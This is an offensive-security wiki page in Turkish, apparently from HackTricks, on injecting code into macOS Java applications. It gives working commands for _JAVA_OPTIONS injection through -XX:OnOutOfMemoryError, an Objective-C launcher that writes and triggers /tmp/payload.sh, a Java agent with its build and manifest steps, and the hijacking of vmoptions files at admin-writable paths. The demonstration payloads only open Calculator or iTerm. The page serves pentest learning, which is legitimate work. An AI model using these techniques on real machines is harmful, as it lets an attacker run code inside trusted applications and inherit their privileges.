# macOS Java Uygulamaları Enjeksiyonu

{{#include ../../../banners/hacktricks-training.md}}

## Sayım

Sisteminizde yüklü Java uygulamalarını bulun. **Info.plist** dosyasındaki Java uygulamalarının **`java.`** dizesini içeren bazı java parametreleri barındırdığı gözlemlenmiştir, bu yüzden bunun için arama yapabilirsiniz:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

Env değişkeni **`_JAVA_OPTIONS`** bir java derlenmiş uygulamasının yürütülmesinde rastgele java parametreleri enjekte etmek için kullanılabilir:
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Bunu yeni bir işlem olarak ve mevcut terminalin bir çocuğu olarak değil, çalıştırmak için şunu kullanabilirsiniz:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Ancak, bu çalıştırılan uygulamada bir hata tetikleyecektir, daha gizli bir yol ise bir java ajanı oluşturmak ve şunu kullanmaktır:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
> [!CAUTION]
> Uygulamadan **farklı bir Java sürümü** ile ajan oluşturmak, hem ajanın hem de uygulamanın çalışmasını çökertilebilir.

Ajanın nerede olabileceği:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Ajanı derlemek için çalıştırın:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
`manifest.txt` ile:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
Ve ardından env değişkenini dışa aktarın ve java uygulamasını şu şekilde çalıştırın:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions dosyası

Bu dosya, Java çalıştırıldığında **Java parametrelerinin** belirtilmesini destekler. Java parametrelerini değiştirmek ve **sürecin rastgele komutlar çalıştırmasını sağlamak** için önceki hilelerden bazılarını kullanabilirsiniz.\
Ayrıca, bu dosya `include` dizini ile **başka dosyaları da içerebilir**, böylece dahil edilen bir dosyayı da değiştirebilirsiniz.

Dahası, bazı Java uygulamaları **birden fazla `vmoptions`** dosyasını **yükleyecektir**.

Android Studio gibi bazı uygulamalar, bu dosyaları nerede aradıklarını **çıktılarında belirtir**, örneğin:
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Eğer yapmazlarsa, bunu kolayca kontrol edebilirsiniz:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Android Studio'nun bu örnekte **`/Applications/Android Studio.app.vmoptions`** dosyasını yüklemeye çalışmasının ne kadar ilginç olduğunu not edin; bu, **`admin`** grubundaki herhangi bir kullanıcının yazma erişimine sahip olduğu bir yerdir. 

{{#include ../../../banners/hacktricks-training.md}}
